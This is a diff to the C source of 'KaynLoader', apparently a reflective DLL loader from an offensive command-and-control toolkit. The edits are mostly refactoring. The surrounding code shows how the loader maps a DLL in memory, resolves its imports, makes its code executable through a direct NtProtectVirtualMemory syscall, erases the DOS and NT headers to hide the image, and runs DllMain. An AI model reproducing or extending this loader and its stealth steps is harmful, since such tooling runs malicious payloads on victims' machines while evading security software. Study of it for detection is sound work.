@@ -10,15 +10,6 @@
 
 typedef BOOL (WINAPI *KAYNDLLMAIN) ( HINSTANCE, DWORD, LPVOID );
 
-VOID MemSet(PVOID Destination, INT Value, SIZE_T Size)
-{
-    PBYTE D = (PBYTE)Destination;
-
-    while (Size--) *D++ = Value;
-
-    return;
-}
-
 DLLEXPORT VOID KaynLoader( LPVOID lpParameter )
 {
     // Module Handles
@@ -38,8 +29,8 @@ DLLEXPORT VOID KaynLoader( LPVOID lpParameter )
     KAYNDLLMAIN             KaynDllMain     = NULL;
 
     // Directory Data
-    PIMAGE_EXPORT_DIRECTORY pImageExportDir         = NULL;
-    LPVOID                  pImageDir               = NULL;
+    PIMAGE_EXPORT_DIRECTORY pImageExportDir = NULL;
+    LPVOID                  pImageDir       = NULL;
 
     // Change memory protection
     LPVOID      lpSectionTextAddr = NULL;
@@ -110,7 +101,7 @@ DLLEXPORT VOID KaynLoader( LPVOID lpParameter )
         // 3. Process our images import table
         // ----------------------------------
 
-        pImageDosHeader = ((PIMAGE_DOS_HEADER)KVirtualMemory);
+        pImageDosHeader = (PIMAGE_DOS_HEADER)KVirtualMemory;
         pImageNtHeaders = RVA_2_VA( PIMAGE_NT_HEADERS, KVirtualMemory, pImageDosHeader->e_lfanew );
 
         pImageDir       = RVA_2_VA( LPVOID, KVirtualMemory, pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress );
@@ -129,15 +120,15 @@ DLLEXPORT VOID KaynLoader( LPVOID lpParameter )
         KaynDllMain =  (KAYNDLLMAIN)((UINT_PTR)KVirtualMemory + (UINT_PTR)pImageNtHeaders->OptionalHeader.AddressOfEntryPoint);
 
         DWORD dwOldProtection = 0;
+
         // change protection from RW to RX
         SyscallPrepare( Sys_NtProtectVirtualMemory );
-        if ( NT_SUCCESS( SyscallInvoke( NtGetCurrentProcess(), &lpSectionTextAddr, &dwSectionTextSize, PAGE_EXECUTE_READ, &dwOldProtection ) ) )
+        if ( NT_SUCCESS( SyscallInvoke( NtGetCurrentProcess(), &lpSectionTextAddr, &dwSectionTextSize, PAGE_EXECUTE_READ, &dwOldProtection ) ) ) 
         {
-
             // ---------------------------
             // 5. Erase DOS and NT headers
             // ---------------------------
-            MemSet( KVirtualMemory, 0, sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS) );
+            KMemSet( KVirtualMemory, 0, sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS) );
 
             // --------------------------------
             // 6. Finally executing our DllMain
@@ -145,9 +136,4 @@ DLLEXPORT VOID KaynLoader( LPVOID lpParameter )
             KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, NULL );
         }
     }
-
-#ifdef DEBUG
-    else __debugbreak(); // well this sounds like a you problem
-#endif
-
 }
